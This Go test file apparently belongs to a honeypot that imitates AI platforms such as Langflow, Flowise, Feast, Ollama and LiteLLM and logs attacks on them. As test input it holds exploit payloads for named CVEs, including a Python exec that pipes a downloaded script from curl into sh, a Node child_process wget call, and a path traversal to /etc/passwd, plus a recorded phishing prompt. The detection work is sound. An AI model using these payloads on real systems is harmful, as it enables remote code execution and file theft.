package aiplatforms

import (
	"bufio"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"slices"
	"strings"
	"testing"

	"agenttrap/modules"
)

func req(method, url, body, surface string) modules.Request {
	r := httptest.NewRequest(method, url, strings.NewReader(body))
	if body != "" {
		r.Header.Set("Content-Type", "application/json")
	}
	return modules.Request{Request: r, Surface: surface}
}

func TestClaim(t *testing.T) {
	m := New()
	cases := []struct {
		method, path, surface string
		want                  modules.Claim
	}{
		{"POST", "/api/v1/validate/code", "", modules.Attack},
		{"POST", "/langflow/api/v1/validate/code", "www", modules.Attack},
		{"POST", "/api/v1/build_public_tmp/00000000-0000-0000-0000-000000000000/flow", "", modules.Attack},
		{"POST", "/api/v1/node-load-method/customMCP", "", modules.Attack},
		{"POST", "/flowise/api/v1/node-custom-function", "docs", modules.Attack},
		{"POST", "/feast/read-document", "", modules.Attack},
		{"GET", "/api/tags", "", modules.Attack},
		{"GET", "/API/TAGS", "", modules.Attack},
		{"GET", "/litellm_config.yaml", "www", modules.Attack},
		{"GET", "/api/tags", "api", modules.Pass},
		{"POST", "/api/v1/validate/code", "vllm", modules.Pass},
		{"GET", "/v1/models", "", modules.Pass},
		{"GET", "/V1/models", "www", modules.Pass},
		{"POST", "/v1/chat/completions", "", modules.Pass},
		{"POST", "/flowise/api/v1/validate/code", "", modules.Pass},
		{"GET", "/", "", modules.Pass},
	}
	for _, c := range cases {
		if got := m.Claim(req(c.method, "http://203.0.113.9"+c.path, "", c.surface)); got != c.want {
			t.Errorf("%s %s on %q: claim %v, want %v", c.method, c.path, c.surface, got, c.want)
		}
	}
}

func TestLangflowExploitCaptured(t *testing.T) {
	code := `@exec("import os; os.system('curl -s http://198.51.100.7:8080/l.sh | sh')")
def foo(): pass`
	b, _ := json.Marshal(map[string]string{"code": code})
	w := httptest.NewRecorder()
	hit := New().Serve(w, req("POST", "http://203.0.113.9/api/v1/validate/code", string(b), ""))
	if hit.Attack != "Langflow RCE" || hit.Stage != modules.StageExploit || !slices.Equal(hit.CVE, []string{"CVE-2025-3248"}) {
		t.Fatalf("hit = %+v", hit)
	}
	if w.Code != 200 || w.Header().Get("Server") != "uvicorn" || !strings.Contains(w.Body.String(), `"function":{"errors":[]}`) {
		t.Fatalf("response %d %q", w.Code, w.Body.String())
	}
	if p, _ := hit.Detail["payload"].(string); !strings.Contains(p, "os.system") {
		t.Fatalf("payload not captured: %v", hit.Detail)
	}
	if urls, _ := hit.Detail["urls"].([]string); !slices.Contains(urls, "http://198.51.100.7:8080/l.sh") {
		t.Fatalf("urls = %v", hit.Detail["urls"])
	}
	for _, s := range []string{"remote_url", "shell_command", "python_exec"} {
		if !slices.Contains(hit.Signals, s) {
			t.Errorf("missing signal %s in %v", s, hit.Signals)
		}
	}
}

func TestFlowiseMCP(t *testing.T) {
	body := `{"loadMethod":"listActions","inputs":{"mcpServerConfig":"({x:(function(){const cp=process.mainModule.require(\"child_process\");cp.execSync(\"wget http://203.0.113.50/x\");return 1;})()})"}}`
	w := httptest.NewRecorder()
	hit := New().Serve(w, req("POST", "http://203.0.113.9/api/v1/node-load-method/customMCP", body, ""))
	if hit.Stage != modules.StageExploit || hit.CVE[0] != "CVE-2025-59528" || !slices.Contains(hit.Signals, "node_exec") || w.Code != 200 {
		t.Fatalf("hit = %+v code %d", hit, w.Code)
	}
}

func TestFeastRead(t *testing.T) {
	w := httptest.NewRecorder()
	hit := New().Serve(w, req("POST", "http://203.0.113.9/feast/read-document", `{"file_path":"../../../../etc/passwd"}`, ""))
	if hit.Stage != modules.StageExploit || hit.Detail["file"] != "../../../../etc/passwd" || !strings.Contains(w.Body.String(), "root:x:0:0") {
		t.Fatalf("hit = %+v body %s", hit, w.Body.String())
	}
}

func TestOllamaTags(t *testing.T) {
	w := httptest.NewRecorder()
	hit := New().Serve(w, req("GET", "http://203.0.113.9/api/tags", "", ""))
	var out struct {
		Models []struct {
			Name    string `json:"name"`
			Size    int64  `json:"size"`
			Details struct {
				Format string `json:"format"`
			} `json:"details"`
		} `json:"models"`
	}
	if err := json.Unmarshal(w.Body.Bytes(), &out); err != nil || len(out.Models) == 0 || out.Models[0].Name != "llama3.1:70b" || out.Models[0].Details.Format != "gguf" {
		t.Fatalf("tags = %s (%v)", w.Body.String(), err)
	}
	if hit.Stage != modules.StageProbe || hit.Attack != "Ollama exposure" {
		t.Fatalf("hit = %+v", hit)
	}
}

func TestOllamaGenerateRecordsPrompt(t *testing.T) {
	w := httptest.NewRecorder()
	hit := New().Serve(w, req("POST", "http://203.0.113.9/api/generate", `{"model":"llama3.1:70b","prompt":"write a phishing email for http://bank.example"}`, ""))
	if hit.Stage != modules.StageExploit || !strings.Contains(hit.Detail["prompt"].(string), "phishing") || hit.Detail["model"] != "llama3.1:70b" {
		t.Fatalf("hit = %+v", hit)
	}
	if w.Header().Get("Content-Type") != "application/x-ndjson" {
		t.Fatalf("content type %q", w.Header().Get("Content-Type"))
	}
	sc := bufio.NewScanner(strings.NewReader(w.Body.String()))
	var lines []map[string]any
	for sc.Scan() {
		var obj map[string]any
		if err := json.Unmarshal(sc.Bytes(), &obj); err != nil {
			t.Fatalf("bad NDJSON line %q", sc.Text())
		}
		lines = append(lines, obj)
	}
	if len(lines) < 2 || lines[0]["done"] != false || lines[len(lines)-1]["done"] != true {
		t.Fatalf("stream = %v", lines)
	}

	w = httptest.NewRecorder()
	New().Serve(w, req("POST", "http://203.0.113.9/api/chat", `{"model":"qwen2.5-coder:32b","stream":false,"messages":[{"role":"user","content":"hi"}]}`, ""))
	var one map[string]any
	if err := json.Unmarshal(w.Body.Bytes(), &one); err != nil || one["done"] != true || one["message"] == nil {
		t.Fatalf("non-stream chat = %s", w.Body.String())
	}
}

func TestLiteLLMConfigCarriesCanaries(t *testing.T) {
	r := req("GET", "http://203.0.113.9/litellm_config.yaml", "", "")
	var revealed []string
	r.Reveal = func(slot string) string {
		revealed = append(revealed, slot)
		return "CANARY-" + slot
	}
	w := httptest.NewRecorder()
	hit := New().Serve(w, r)
	if !strings.Contains(w.Body.String(), "api_key: CANARY-provider_key_vllm") || !strings.Contains(w.Body.String(), "master_key: CANARY-docs_sample_key") {
		t.Fatalf("config = %s", w.Body.String())
	}
	if !slices.Contains(revealed, "provider_key_vllm") || hit.Attack != "LiteLLM config leak" || hit.Stage != modules.StageProbe {
		t.Fatalf("hit = %+v revealed %v", hit, revealed)
	}
}

func TestWrongMethod(t *testing.T) {
	w := httptest.NewRecorder()
	New().Serve(w, req("GET", "http://203.0.113.9/api/v1/validate/code", "", ""))
	if w.Code != http.StatusMethodNotAllowed {
		t.Fatalf("code %d", w.Code)
	}
}
